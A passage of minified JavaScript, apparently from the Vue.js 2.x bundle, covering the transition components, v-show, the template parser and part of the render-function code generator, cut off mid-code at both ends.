r=t.value,i=(n=Pa(n)).data&&n.data.transition,a=e.__vOriginalDisplay="none"===e.style.display?"":e.style.display;r&&i?(n.data.show=!0,ma(n,(function(){e.style.display=a}))):e.style.display=r?a:"none"},update:function(e,t,n){var r=t.value;!r!=!t.oldValue&&((n=Pa(n)).data&&n.data.transition?(n.data.show=!0,r?ma(n,(function(){e.style.display=e.__vOriginalDisplay})):va(n,(function(){e.style.display="none"}))):e.style.display=r?e.__vOriginalDisplay:"none")},unbind:function(e,t,n,r,i){i||(e.style.display=e.__vOriginalDisplay)}}},Fa={name:String,appear:Boolean,css:Boolean,mode:String,type:String,enterClass:String,leaveClass:String,enterToClass:String,leaveToClass:String,enterActiveClass:String,leaveActiveClass:String,appearClass:String,appearActiveClass:String,appearToClass:String,duration:[Number,String,Object]};function La(e){var t=e&&e.componentOptions;return t&&t.Ctor.options.abstract?La(mn(t.children)):e}function Oa(e){var t={},n=e.$options;for(var r in n.propsData)t[r]=e[r];var i=n._parentListeners;for(var a in i)t[S(a)]=i[a];return t}function Na(e,t){if(/\d-keep-alive$/.test(t.tag))return e("keep-alive",{props:t.componentOptions.propsData})}var Da=function(e){return e.tag||An(e)},Ra=function(e){return"show"===e.name},ja={name:"transition",props:Fa,abstract:!0,render:function(e){var t=this,n=this.$slots.default;if(n&&(n=n.filter(Da)).length){1<n.length&&pe("<transition> can only be used on a single element. Use <transition-group> for lists.",this.$parent);var r=this.mode;r&&"in-out"!==r&&"out-in"!==r&&pe("invalid <transition> mode: "+r,this.$parent);var i=n[0];if(function(e){for(;e=e.parent;)if(e.data.transition)return!0}(this.$vnode))return i;var a=La(i);if(!a)return i;if(this._leaving)return Na(e,i);var o="__transition-"+this._uid+"-";a.key=null==a.key?a.isComment?o+"comment":o+a.tag:s(a.key)?0===String(a.key).indexOf(o)?a.key:o+a.key:a.key;var l,c,u=(a.data||(a.data={})).transition=Oa(this),d=this._vnode,p=La(d);if(a.data.directives&&a.data.directives.some(Ra)&&(a.data.show=!0),p&&p.data&&(l=a,(c=p).key!==l.key||c.tag!==l.tag)&&!An(p)&&(!p.componentInstance||!p.componentInstance._vnode.isComment)){var h=p.data.transition=P({},u);if("out-in"===r)return this._leaving=!0,It(h,"afterLeave",(function(){t._leaving=!1,t.$forceUpdate()})),Na(e,i);if("in-out"===r){if(An(a))return d;var f,A=function(){f()};It(u,"afterEnter",A),It(u,"enterCancelled",A),It(h,"delayLeave",(function(e){f=e}))}}return i}}},Ua=P({tag:String,moveClass:String},Fa);function $a(e){e.elm._moveCb&&e.elm._moveCb(),e.elm._enterCb&&e.elm._enterCb()}function za(e){e.data.newPos=e.elm.getBoundingClientRect()}function Ha(e){var t=e.data.pos,n=e.data.newPos,r=t.left-n.left,i=t.top-n.top;if(r||i){e.data.moved=!0;var a=e.elm.style;a.transform=a.WebkitTransform="translate("+r+"px,"+i+"px)",a.transitionDuration="0s"}}delete Ua.mode;var Va={Transition:ja,TransitionGroup:{props:Ua,beforeMount:function(){var e=this,t=this._update;this._update=function(n,r){var i=Cn(e);e.__patch__(e._vnode,e.kept,!1,!0),e._vnode=e.kept,i(),t.call(e,n,r)}},render:function(e){for(var t=this.tag||this.$vnode.data.tag||"span",n=Object.create(null),r=this.prevChildren=this.children,i=this.$slots.default||[],a=this.children=[],o=Oa(this),s=0;s<i.length;s++){var l=i[s];if(l.tag)if(null!=l.key&&0!==String(l.key).indexOf("__vlist"))a.push(l),((n[l.key]=l).data||(l.data={})).transition=o;else{var c=l.componentOptions,u=c?c.Ctor.options.name||c.tag||"":l.tag;pe("<transition-group> children must be keyed: <"+u+">")}}if(r){for(var d=[],p=[],h=0;h<r.length;h++){var f=r[h];f.data.transition=o,f.data.pos=f.elm.getBoundingClientRect(),n[f.key]?d.push(f):p.push(f)}this.kept=e(t,null,d),this.removed=p}return e(t,null,a)},updated:function(){var e=this.prevChildren,t=this.moveClass||(this.name||"v")+"-move";e.length&&this.hasMove(e[0].elm,t)&&(e.forEach($a),e.forEach(za),e.forEach(Ha),this._reflow=document.body.offsetHeight,e.forEach((function(e){if(e.data.moved){var n=e.elm,r=n.style;ca(n,t),r.transform=r.WebkitTransform=r.transitionDuration="",n.addEventListener(ia,n._moveCb=function e(r){r&&r.target!==n||r&&!/transform$/.test(r.propertyName)||(n.removeEventListener(ia,e),n._moveCb=null,ua(n,t))})}})))},methods:{hasMove:function(e,t){if(!ea)return!1;if(this._hasMove)return this._hasMove;var n=e.cloneNode();e._transitionClasses&&e._transitionClasses.forEach((function(e){Yi(n,e)})),Xi(n,t),n.style.display="none",this.$el.appendChild(n);var r=ha(n);return this.$el.removeChild(n),this._hasMove=r.hasTransform}}}};nr.config.mustUseProp=fr,nr.config.isReservedTag=Br,nr.config.isReservedAttr=pr,nr.config.getTagNamespace=Er,nr.config.isUnknownElement=function(e){if(!q)return!0;if(Br(e))return!1;if(e=e.toLowerCase(),null!=Tr[e])return Tr[e];var t=document.createElement(e);return-1<e.indexOf("-")?Tr[e]=t.constructor===window.HTMLUnknownElement||t.constructor===window.HTMLElement:Tr[e]=/HTMLUnknownElement/.test(t.toString())},P(nr.options.directives,Ia),P(nr.options.components,Va),nr.prototype.__patch__=q?wa:F,nr.prototype.$mount=function(e,t){return r=e=e&&q?Ir(e):void 0,i=t,(n=this).$el=r,n.$options.render||(n.$options.render=Se,n.$options.template&&"#"!==n.$options.template.charAt(0)||n.$options.el||r?pe("You are using the runtime-only build of Vue where the template compiler is not available. Either pre-compile the templates into render functions, or use the compiler-included build.",n):pe("Failed to mount component: template or render function not defined.",n)),kn(n,"beforeMount"),a=z.performance&&st?function(){var e=n._name,t=n._uid,r="vue-perf-start:"+t,a="vue-perf-end:"+t;st(r);var o=n._render();st(a),lt("vue "+e+" render",r,a),st(r),n._update(o,i),st(a),lt("vue "+e+" patch",r,a)}:function(){n._update(n._render(),i)},new jn(n,a,F,{before:function(){n._isMounted&&!n._isDestroyed&&kn(n,"beforeUpdate")}},!0),i=!1,null==n.$vnode&&(n._isMounted=!0,kn(n,"mounted")),n;var n,r,i,a},q&&setTimeout((function(){z.devtools&&le&&le.emit("init",nr),z.productionTip}),0);var Qa=/\{\{((?:.|\r?\n)+?)\}\}/g,Ga=/[-.*+?^${}()|[\]\/\\]/g,Wa=C((function(e){var t=e[0].replace(Ga,"\\$&"),n=e[1].replace(Ga,"\\$&");return new RegExp(t+"((?:.|\\n)+?)"+n,"g")}));function Ka(e,t){var n=t?Wa(t):Qa;if(n.test(e)){for(var r,i,a,o=[],s=[],l=n.lastIndex=0;r=n.exec(e);){l<(i=r.index)&&(s.push(a=e.slice(l,i)),o.push(JSON.stringify(a)));var c=oi(r[1].trim());o.push("_s("+c+")"),s.push({"@binding":c}),l=i+r[0].length}return l<e.length&&(s.push(a=e.slice(l)),o.push(JSON.stringify(a))),{expression:o.join("+"),tokens:s}}}var qa,Xa,Ya,Ja,Za,eo,to,no,ro,io,ao={staticKeys:["staticClass"],transformNode:function(e,t){var n=t.warn||li,r=vi(e,"class");r&&Ka(r,t.delimiters)&&n('class="'+r+'": Interpolation inside attributes has been removed. Use v-bind or the colon shorthand instead. For example, instead of <div class="{{ val }}">, use <div :class="val">.',e.rawAttrsMap.class),r&&(e.staticClass=JSON.stringify(r));var i=mi(e,"class",!1);i&&(e.classBinding=i)},genData:function(e){var t="";return e.staticClass&&(t+="staticClass:"+e.staticClass+","),e.classBinding&&(t+="class:"+e.classBinding+","),t}},oo={staticKeys:["staticStyle"],transformNode:function(e,t){var n=t.warn||li,r=vi(e,"style");r&&(Ka(r,t.delimiters)&&n('style="'+r+'": Interpolation inside attributes has been removed. Use v-bind or the colon shorthand instead. For example, instead of <div style="{{ val }}">, use <div :style="val">.',e.rawAttrsMap.style),e.staticStyle=JSON.stringify(Ri(r)));var i=mi(e,"style",!1);i&&(e.styleBinding=i)},genData:function(e){var t="";return e.staticStyle&&(t+="staticStyle:"+e.staticStyle+","),e.styleBinding&&(t+="style:("+e.styleBinding+"),"),t}},so=v("area,base,br,col,embed,frame,hr,img,input,isindex,keygen,link,meta,param,source,track,wbr"),lo=v("colgroup,dd,dt,li,options,p,td,tfoot,th,thead,tr,source"),co=v("address,article,aside,base,blockquote,body,caption,col,colgroup,dd,details,dialog,div,dl,dt,fieldset,figcaption,figure,footer,form,h1,h2,h3,h4,h5,h6,head,header,hgroup,hr,html,legend,li,menuitem,meta,optgroup,option,param,rp,rt,source,style,summary,tbody,td,tfoot,th,thead,title,tr,track"),uo=/^\s*([^\s"'<>\/=]+)(?:\s*(=)\s*(?:"([^"]*)"+|'([^']*)'+|([^\s"'=<>`]+)))?/,po=/^\s*((?:v-[\w-]+:|@|:|#)\[[^=]+\][^\s"'<>\/=]*)(?:\s*(=)\s*(?:"([^"]*)"+|'([^']*)'+|([^\s"'=<>`]+)))?/,ho="[a-zA-Z_][\\-\\.0-9_a-zA-Z"+H.source+"]*",fo="((?:"+ho+"\\:)?"+ho+")",Ao=new RegExp("^<"+fo),mo=/^\s*(\/?)>/,vo=new RegExp("^<\\/"+fo+"[^>]*>"),go=/^<!DOCTYPE [^>]+>/i,yo=/^<!\--/,bo=/^<!\[/,_o=v("script,style,textarea",!0),wo={},Co={"&lt;":"<","&gt;":">","&quot;":'"',"&amp;":"&","&#10;":"\n","&#9;":"\t","&#39;":"'"},xo=/&(?:lt|gt|quot|amp|#39);/g,So=/&(?:lt|gt|quot|amp|#39|#10|#9);/g,ko=v("pre,textarea",!0),Mo=function(e,t){return e&&ko(e)&&"\n"===t[0]},Bo=/^@|^v-on:/,Eo=/^v-|^@|^:|^#/,To=/([\s\S]*?)\s+(?:in|of)\s+([\s\S]*)/,Po=/,([^,\}\]]*)(?:,([^,\}\]]*))?$/,Io=/^\(|\)$/g,Fo=/^\[.*\]$/,Lo=/:(.*)$/,Oo=/^:|^\.|^v-bind:/,No=/\.[^.\]]+(?=[^\]]*$)/g,Do=/^v-slot(:|$)|^#/,Ro=/[\r\n]/,jo=/\s+/g,Uo=/[\s"'<>\/=]/,$o=C((function(e){return(qa=qa||document.createElement("div")).innerHTML=e,qa.textContent})),zo="_empty_";function Ho(e,t,n){return{type:1,tag:e,attrsList:t,attrsMap:function(e){for(var t={},n=0,r=e.length;n<r;n++)!t[e[n].name]||Z||te||Xa("duplicate attribute: "+e[n].name,e[n]),t[e[n].name]=e[n].value;return t}(t),rawAttrsMap:{},parent:n,children:[]}}function Vo(e,t){var n,r,i;!function(e){var t=mi(e,"key");if(t){if("template"===e.tag&&Xa("<template> cannot be keyed. Place the key on real elements instead.",Ai(e,"key")),e.for){var n=e.iterator2||e.iterator1,r=e.parent;n&&n===t&&r&&"transition-group"===r.tag&&Xa("Do not use v-for index as key on <transition-group> children, this is the same as not using keys.",Ai(e,"key"),!0)}e.key=t}}(e),e.plain=!e.key&&!e.scopedSlots&&!e.attrsList.length,(r=mi(n=e,"ref"))&&(n.ref=r,n.refInFor=function(e){for(var t=e;t;){if(void 0!==t.for)return!0;t=t.parent}return!1}(n)),function(e){var t;"template"===e.tag?((t=vi(e,"scope"))&&Xa('the "scope" attribute for scoped slots have been deprecated and replaced by "slot-scope" since 2.5. The new "slot-scope" attribute can also be used on plain elements in addition to <template> to denote scoped slots.',e.rawAttrsMap.scope,!0),e.slotScope=t||vi(e,"slot-scope")):(t=vi(e,"slot-scope"))&&(e.attrsMap["v-for"]&&Xa("Ambiguous combined usage of slot-scope and v-for on <"+e.tag+"> (v-for takes higher priority). Use a wrapper <template> for the scoped slot to make it clearer.",e.rawAttrsMap["slot-scope"],!0),e.slotScope=t);var n=mi(e,"slot");if(n&&(e.slotTarget='""'===n?'"default"':n,e.slotTargetDynamic=!(!e.attrsMap[":slot"]&&!e.attrsMap["v-bind:slot"]),"template"===e.tag||e.slotScope||di(e,"slot",n,Ai(e,"slot"))),"template"===e.tag){var r=gi(e,Do);if(r){(e.slotTarget||e.slotScope)&&Xa("Unexpected mixed usage of different slot syntaxes.",e),e.parent&&!io(e.parent)&&Xa("<template v-slot> can only appear at the root level inside the receiving component",e);var i=Wo(r),a=i.name,o=i.dynamic;e.slotTarget=a,e.slotTargetDynamic=o,e.slotScope=r.value||zo}}else{var s=gi(e,Do);if(s){io(e)||Xa("v-slot can only be used on components or <template>.",s),(e.slotScope||e.slotTarget)&&Xa("Unexpected mixed usage of different slot syntaxes.",e),e.scopedSlots&&Xa("To avoid scope ambiguity, the default slot should also use <template> syntax when there are other named slots.",s);var l=e.scopedSlots||(e.scopedSlots={}),c=Wo(s),u=c.name,d=c.dynamic,p=l[u]=Ho("template",[],e);p.slotTarget=u,p.slotTargetDynamic=d,p.children=e.children.filter((function(e){if(!e.slotScope)return e.parent=p,!0})),p.slotScope=s.value||zo,e.children=[],e.plain=!1}}}(e),"slot"===(i=e).tag&&(i.slotName=mi(i,"name"),i.key&&Xa("`key` does not work on <slot> because slots are abstract outlets and can possibly expand into multiple elements. Use the key on a wrapping element instead.",Ai(i,"key"))),function(e){var t;(t=mi(e,"is"))&&(e.component=t),null!=vi(e,"inline-template")&&(e.inlineTemplate=!0)}(e);for(var a=0;a<Ja.length;a++)e=Ja[a](e,t)||e;return function(e){var t,n,r,i,a,o,s,l,c,u,d,p,h,f,A,m,v=e.attrsList;for(t=0,n=v.length;t<n;t++)if(r=i=v[t].name,a=v[t].value,Eo.test(r))if(e.hasBindings=!0,(o=Ko(r.replace(Eo,"")))&&(r=r.replace(No,"")),Oo.test(r))r=r.replace(Oo,""),a=oi(a),(l=Fo.test(r))&&(r=r.slice(1,-1)),0===a.trim().length&&Xa('The value for a v-bind expression cannot be empty. Found in "v-bind:'+r+'"'),o&&(o.prop&&!l&&"innerHtml"===(r=S(r))&&(r="innerHTML"),o.camel&&!l&&(r=S(r)),o.sync&&(s=_i(a,"$event"),l?fi(e,'"update:"+('+r+")",s,null,!1,Xa,v[t],!0):(fi(e,"update:"+S(r),s,null,!1,Xa,v[t]),B(r)!==S(r)&&fi(e,"update:"+B(r),s,null,!1,Xa,v[t])))),o&&o.prop||!e.component&&no(e.tag,e.attrsMap.type,r)?ui(e,r,a,v[t],l):di(e,r,a,v[t],l);else if(Bo.test(r))r=r.replace(Bo,""),(l=Fo.test(r))&&(r=r.slice(1,-1)),fi(e,r,a,o,!1,Xa,v[t],l);else{var g=(r=r.replace(Eo,"")).match(Lo),y=g&&g[1];l=!1,y&&(r=r.slice(0,-(y.length+1)),Fo.test(y)&&(y=y.slice(1,-1),l=!0)),c=e,u=r,d=i,p=a,h=y,f=l,A=o,m=v[t],(c.directives||(c.directives=[])).push(yi({name:u,rawName:d,value:p,arg:h,isDynamicArg:f,modifiers:A},m)),c.plain=!1,"model"===r&&Yo(e,a)}else{Ka(a,Ya)&&Xa(r+'="'+a+'": Interpolation inside attributes has been removed. Use v-bind or the colon shorthand instead. For example, instead of <div id="{{ val }}">, use <div :id="val">.',v[t]),di(e,r,JSON.stringify(a),v[t]),!e.component&&"muted"===r&&no(e.tag,e.attrsMap.type,r)&&ui(e,r,"true",v[t])}}(e),e}function Qo(e){var t;if(t=vi(e,"v-for")){var n=function(e){var t=e.match(To);if(t){var n={};n.for=t[2].trim();var r=t[1].trim().replace(Io,""),i=r.match(Po);return i?(n.alias=r.replace(Po,"").trim(),n.iterator1=i[1].trim(),i[2]&&(n.iterator2=i[2].trim())):n.alias=r,n}}(t);n?P(e,n):Xa("Invalid v-for expression: "+t,e.rawAttrsMap["v-for"])}}function Go(e,t){e.ifConditions||(e.ifConditions=[]),e.ifConditions.push(t)}function Wo(e){var t=e.name.replace(Do,"");return t||("#"!==e.name[0]?t="default":Xa("v-slot shorthand syntax requires a slot name.",e)),Fo.test(t)?{name:t.slice(1,-1),dynamic:!0}:{name:'"'+t+'"',dynamic:!1}}function Ko(e){var t=e.match(No);if(t){var n={};return t.forEach((function(e){n[e.slice(1)]=!0})),n}}var qo=/^xmlns:NS\d+/,Xo=/^NS\d+:/;function Yo(e,t){for(var n=e;n;)n.for&&n.alias===t&&Xa("<"+e.tag+' v-model="'+t+'">: You are binding v-model directly to a v-for iteration alias. This will not be able to modify the v-for source array because writing to the alias is like modifying a function local variable. Consider using an array of objects and use v-model on an object property instead.',e.rawAttrsMap["v-model"]),n=n.parent}function Jo(e){return Ho(e.tag,e.attrsList.slice(),e.parent)}var Zo,es,ts,ns=[ao,oo,{preTransformNode:function(e,t){if("input"===e.tag){var n,r=e.attrsMap;if(!r["v-model"])return;if((r[":type"]||r["v-bind:type"])&&(n=mi(e,"type")),r.type||n||!r["v-bind"]||(n="("+r["v-bind"]+").type"),n){var i=vi(e,"v-if",!0),a=i?"&&("+i+")":"",o=null!=vi(e,"v-else",!0),s=vi(e,"v-else-if",!0),l=Jo(e);Qo(l),pi(l,"type","checkbox"),Vo(l,t),l.processed=!0,l.if="("+n+")==='checkbox'"+a,Go(l,{exp:l.if,block:l});var c=Jo(e);vi(c,"v-for",!0),pi(c,"type","radio"),Vo(c,t),Go(l,{exp:"("+n+")==='radio'"+a,block:c});var u=Jo(e);return vi(u,"v-for",!0),pi(u,":type",n),Vo(u,t),Go(l,{exp:i,block:u}),o?l.else=!0:s&&(l.elseif=s),l}}}}],rs={expectHTML:!0,modules:ns,directives:{model:function(e,t,n){ri=n;var r,i,a,o,s,l,c,u,d,p,h,f,A,m,v=t.value,g=t.modifiers,y=e.tag,b=e.attrsMap.type;if("input"===y&&"file"===b&&ri("<"+e.tag+' v-model="'+v+'" type="file">:\nFile inputs are read only. Use a v-on:change listener instead.',e.rawAttrsMap["v-model"]),e.component)return bi(e,v,g),!1;if("select"===y)A=v,fi(e,"change",'var $$selectedVal = Array.prototype.filter.call($event.target.options,function(o){return o.selected}).map(function(o){var val = "_value" in o ? o._value : o.value;return '+((m=g)&&m.number?"_n(val)":"val")+"});"+" "+_i(A,"$event.target.multiple ? $$selectedVal : $$selectedVal[0]"),null,!0);else if("input"===y&&"checkbox"===b)l=e,c=v,d=(u=g)&&u.number,p=mi(l,"value")||"null",h=mi(l,"true-value")||"true",f=mi(l,"false-value")||"false",ui(l,"checked","Array.isArray("+c+")?_i("+c+","+p+")>-1"+("true"===h?":("+c+")":":_q("+c+","+h+")")),fi(l,"change","var $$a="+c+",$$el=$event.target,$$c=$$el.checked?("+h+"):("+f+");if(Array.isArray($$a)){var $$v="+(d?"_n("+p+")":p)+",$$i=_i($$a,$$v);if($$el.checked){$$i<0&&("+_i(c,"$$a.concat([$$v])")+")}else{$$i>-1&&("+_i(c,"$$a.slice(0,$$i).concat($$a.slice($$i+1))")+")}}else{"+_i(c,"$$c")+"}",null,!0);else if("input"===y&&"radio"===b)r=e,i=v,o=(a=g)&&a.number,s=mi(r,"value")||"null",ui(r,"checked","_q("+i+","+(s=o?"_n("+s+")":s)+")"),fi(r,"change",_i(i,s),null,!0);else if("input"===y||"textarea"===y)!function(e,t,n){var r=e.attrsMap.type,i=e.attrsMap["v-bind:value"]||e.attrsMap[":value"],a=e.attrsMap["v-bind:type"]||e.attrsMap[":type"];if(i&&!a){var o=e.attrsMap["v-bind:value"]?"v-bind:value":":value";ri(o+'="'+i+'" conflicts with v-model on the same element because the latter already expands to a value binding internally',e.rawAttrsMap[o])}var s=n||{},l=s.lazy,c=s.number,u=s.trim,d=!l&&"range"!==r,p=l?"change":"range"===r?Bi:"input",h="$event.target.value";u&&(h="$event.target.value.trim()"),c&&(h="_n("+h+")");var f=_i(t,h);d&&(f="if($event.target.composing)return;"+f),ui(e,"value","("+t+")"),fi(e,p,f,null,!0),(u||c)&&fi(e,"blur","$forceUpdate()")}(e,v,g);else{if(!z.isReservedTag(y))return bi(e,v,g),!1;ri("<"+e.tag+' v-model="'+v+"\">: v-model is not supported on this element type. If you are working with contenteditable, it's recommended to wrap a library dedicated for that purpose inside a custom component.",e.rawAttrsMap["v-model"])}return!0},text:function(e,t){t.value&&ui(e,"textContent","_s("+t.value+")",t)},html:function(e,t){t.value&&ui(e,"innerHTML","_s("+t.value+")",t)}},isPreTag:function(e){return"pre"===e},isUnaryTag:so,mustUseProp:fr,canBeLeftOpenTag:lo,isReservedTag:Br,getTagNamespace:Er,staticKeys:(Zo=ns,Zo.reduce((function(e,t){return e.concat(t.staticKeys||[])}),[]).join(","))},is=C((function(e){return v("type,tag,attrsList,attrsMap,plain,parent,children,attrs,start,end,rawAttrsMap"+(e?","+e:""))}));function as(e){return 2!==e.type&&(3===e.type||!(!e.pre&&(e.hasBindings||e.if||e.for||g(e.tag)||!ts(e.tag)||function(e){for(;e.parent;){if("template"!==(e=e.parent).tag)return!1;if(e.for)return!0}return!1}(e)||!Object.keys(e).every(es))))}var os=/^([\w$_]+|\([^)]*?\))\s*=>|^function(?:\s+[\w$]+)?\s*\(/,ss=/\([^)]*?\);*$/,ls=/^[A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*|\['[^']*?']|\["[^"]*?"]|\[\d+]|\[[A-Za-z_$][\w$]*])*$/,cs={esc:27,tab:9,enter:13,space:32,up:38,left:37,right:39,down:40,delete:[8,46]},us={esc:["Esc","Escape"],tab:"Tab",enter:"Enter",space:[" ","Spacebar"],up:["Up","ArrowUp"],left:["Left","ArrowLeft"],right:["Right","ArrowRight"],down:["Down","ArrowDown"],delete:["Backspace","Delete","Del"]},ds=function(e){return"if("+e+")return null;"},ps={stop:"$event.stopPropagation();",prevent:"$event.preventDefault();",self:ds("$event.target !== $event.currentTarget"),ctrl:ds("!$event.ctrlKey"),shift:ds("!$event.shiftKey"),alt:ds("!$event.altKey"),meta:ds("!$event.metaKey"),left:ds("'button' in $event && $event.button !== 0"),middle:ds("'button' in $event && $event.button !== 1"),right:ds("'button' in $event && $event.button !== 2")};function hs(e,t){var n=t?"nativeOn:":"on:",r="",i="";for(var a in e){var o=fs(e[a]);e[a]&&e[a].dynamic?i+=a+","+o+",":r+='"'+a+'":'+o+","}return r="{"+r.slice(0,-1)+"}",i?n+"_d("+r+",["+i.slice(0,-1)+"])":n+r}function fs(e){if(!e)return"function(){}";if(Array.isArray(e))return"["+e.map((function(e){return fs(e)})).join(",")+"]";var t=ls.test(e.value),n=os.test(e.value),r=ls.test(e.value.replace(ss,""));if(e.modifiers){var i="",a="",o=[];for(var s in e.modifiers)if(ps[s])a+=ps[s],cs[s]&&o.push(s);else if("exact"===s){var l=e.modifiers;a+=ds(["ctrl","shift","alt","meta"].filter((function(e){return!l[e]})).map((function(e){return"$event."+e+"Key"})).join("||"))}else o.push(s);return o.length&&(i+="if(!$event.type.indexOf('key')&&"+o.map(As).join("&&")+")return null;"),a&&(i+=a),"function($event){"+i+(t?"return "+e.value+"($event)":n?"return ("+e.value+")($event)":r?"return "+e.value:e.value)+"}"}return t||n?e.value:"function($event){"+(r?"return "+e.value:e.value)+"}"}function As(e){var t=parseInt(e,10);if(t)return"$event.keyCode!=="+t;var n=cs[e],r=us[e];return"_k($event.keyCode,"+JSON.stringify(e)+","+JSON.stringify(n)+",$event.key,"+JSON.stringify(r)+")"}var ms={on:function(e,t){t.modifiers&&pe("v-on without argument does not support modifiers."),e.wrapListeners=function(e){return"_g("+e+","+t.value+")"}},bind:function(e,t){e.wrapData=function(n){return"_b("+n+",'"+e.tag+"',"+t.value+","+(t.modifiers&&t.modifiers.prop?"true":"false")+(t.modifiers&&t.modifiers.sync?",true":"")+")"}},cloak:F},vs=function(e){this.options=e,this.warn=e.warn||li,this.transforms=ci(e.modules,"transformCode"),this.dataGenFns=ci(e.modules,"genData"),this.directives=P(P({},ms),e.directives);var t=e.isReservedTag||L;this.maybeComponent=function(e){return!!e.component||!t(e.tag)},this.onceId=0,this.staticRenderFns=[],this.pre=!1};function gs(e,t){var n=new vs(t);return{render:"with(this){return "+(e?ys(e,n):'_c("div")')+"}",staticRenderFns:n.staticRenderFns}}function ys(e,t){if(e.parent&&(e.pre=e.pre||e.parent.pre),e.staticRoot&&!e.staticProcessed)return bs(e,t);if(e.once&&!e.onceProcessed)return _s(e,t);if(e.for&&!e.forProcessed)return Cs(e,t);if(e.if&&!e.ifProcessed)return ws(e,t);if("template"!==e.tag||e.slotTarget||t.pre){if("slot"===e.tag)return function(e,t){var n=e.slotName||'"default"',r=Ms(e,t),i="_t("+n+(r?","+r:""),a=e.attrs||e.dynamicAttrs?Ts((e.attrs||[]).concat(e.dynamicAttrs||[]).map((function(e){return{name:S(e.name),value:e.value,dynamic:e.dynamic}}))):null,o=e.attrsMap["v-bind"];return!a&&!o||r||(i+=",null"),a&&(i+=","+a),o&&(i+=(a?"":",null")+","+o),i+")"}(e,t);var n;if(e.component)o=e.component,l=t,c=(s=e).inlineTemplate?null:Ms(s,l,!0),n="_c("+o+","+xs(s,l)+(c?","+c:"")+")";else{var r;(!e.plain||e.pre&&t.maybeComponent(e))&&(r=xs(e,t));var i=e.inlineTemplate?null:Ms(e,t,!0);n="_c('"+e.tag+"'"+(r?","+r:"")+(i?","+i:"")+")"}for(var a=0;a<t.transforms.length;a++)n=t.transforms[a](e,n);return n}return Ms(e,t)||"void 0";var o,s,l,c}function bs(e,t){e.staticProcessed=!0;var n=t.pre;return e.pre&&(t.pre=e.pre),t.staticRenderFns.push("with(this){return "+ys(e,t)+"}"),t.pre=n,"_m("+(t.staticRenderFns.length-1)+(e.staticInFor?",true":"")+")"}function _s(e,t){if(e.onceProcessed=!0,e.if&&!e.ifProcessed)return ws(e,t);if(e.staticInFor){for(var n="",r=e.parent;r;){if(r.for){n=r.key;break}r=r.parent}return n?"_o("+ys(e,t)+","+t.onceId+++","+n+")":(t.warn("v-once can only be used inside v-for that is keyed. ",e.rawAttrsMap["v-once"]),ys(e,t))}return bs(e,t)}function ws(e,t,n,r){return e.ifProcessed=!0,function e(t,n,r,i){if(!t.length)return i||"_e()";var a=t.shift();return a.exp?"("+a.exp+")?"+o(a.block)+":"+e(t,n,r,i):""+o(a.block);function o(e){return r?r(e,n):e.once?_s(e,n):ys(e,n)}}(e.ifConditions.slice(),t,n,r)}function Cs(e,t,n,r){var i=e.for,a=e.alias,o=e.iterator1?","+e.iterator1:"",s=e.iterator2?","+e.iterator2:"";return t.maybeComponent(e)&&"slot"!==e.tag&&"template"!==e.tag&&!e.key&&t.warn("<"+e.tag+' v-for="'+a+" in "+i+'">: component lists rendered with v-for should have explicit keys. See https://vuejs.org/guide/list.html#key for more info.',e.rawAttrsMap["v-for"],!0),e.forProcessed=!0,(r||"_l")+"(("+i+"),function("+a+o+s+"){return "+(n||ys)(e,t)+"})"}function xs(e,t){var n="{",r=function(e,t){var n=e.directives;if(n){var r,i,a,o,s="directives:[",l=!1;for(r=0,i=n.length;r<i;r++){a=n[r],o=!0;var c=t.directives[a.name];c&&(o=!!c(e,a,t.warn)),o&&(l=!0,s+='{name:"'+a.name+'",rawName:"'+a.rawName+'"'+(a.value?",value:("+a.value+"),expression:"+JSON.stringify(a.value):"")+(a.arg?",arg:"+(a.isDynamicArg?a.arg:'"'+a.arg+'"'):"")+(a.modifiers?",modifiers:"+JSON.stringify(a.modifiers):"")+"},")}return l?s.slice(0,-1)+"]":void 0}}(e,t);r&&(n+=r+","),e.key&&(n+="key:"+e.key+","),e.ref&&(n+="ref:"+e.ref+","),e.refInFor&&(n+="refInFor:true,"),e.pre&&(n+="pre:true,"),e.component&&(n+='tag:"'+e.tag+'",');for(var i=0;i<t.dataGenFns.length;i++)n+=t.dataGenFns[i](e);if(e.attrs&&(n+="attrs:"+Ts(e.attrs)+","),e.props&&(n+="domProps:"+Ts(e.props)+","),e.events&&(n+=hs(e.events,!1)+","),e.nativeEvents&&(n+=hs(e.nativeEvents,!0)+","),e.slotTarget&&!e.slotScope&&(n+="slot:"+e.slotTarget+","),e.scopedSlots&&(n+=function(e,t,n){var r=e.for||Object.keys(t).some((function(e){var n=t[e];return n.slotTargetDynamic||n.if||n.for||Ss(n)})),i=!!e.if;if(!r)for(var a=e.parent;a;){if(a.slotScope&&a.slotScope!==zo||a.for){r=!0;break}a.if&&(i=!0),a=a.parent}var o=Object.keys(t).map((function(e){return ks(t[e],n)})).join(",");return"scopedSlots:_u(["+o+"]"+(r?",null,true":"")+(!r&&i?",null,false,"+function(e){for(var t=5381,n=e.length;n;)t=33*t^e.charCodeAt(--n);return t>>>0}(o):"")+")"}(e,e.scopedSlots,t)+","),e.model&&(n+="model:{value:"+e.model.value+",callback:"+e.model.callback+",expression:"+e.model.expression+"},"),e.inlineTemplate){var a=function(e,t){var n=e.children[0];if(1===e.children.length&&1===n.type||t.warn("Inline-template components must have exactly one child element.",{start:e.start}),n&&1===n.type){var r=gs(n,t.options);return"inlineTemplate:{render:function(){"+r.render+"},staticRenderFns:["+r.staticRenderFns.map((function(e){return"function(){"+e+"}"})).join(",")+"]}"}}(e,t);a&&(n+=a+",")}return n=n.replace(/,$/,"")+"}",e.dynamicAttrs&&(n="_b("+n+',"'+e.tag+'",'+Ts(e.dynamicAttrs)+")"),e.wrapData&&(n=e.wrapData(n)),e.wrapListeners&&(n=e.wrapListeners(n)),n}function Ss(e){return 1===e.type&&("slot"===e.tag||e.children.some(Ss))}function ks(e,t){var n=e.attrsMap["slot-scope"];if(e.if&&!e.ifProcessed&&!n)return ws(e,t,ks,"null");if(e.for&&!e.forProcessed)return Cs(e,t,ks);var r=e.slotScope===zo?"":String(e.slotScope),i="function("+r+"){return "+("template"===e.tag?e.if&&n?"("+e.if+")?"+(Ms(e,t)||"undefined")+":undefined":Ms(e,t)||"undefined":ys(e,t))+"}",a=r?"":",proxy:true";return"{key:"+(e.slotTarget||'"default"')+",fn:"+i+a+"}"}function Ms(e,t,n,r,i){var a=e.children;if(a.length){var o=a[0];if(1===a.length&&o.for&&"template"!==o.tag&&"slot"!==o.tag){var s=n?t.maybeComponent(o)?",1":",0":"";return""+(r||ys)(o,t)+s}var 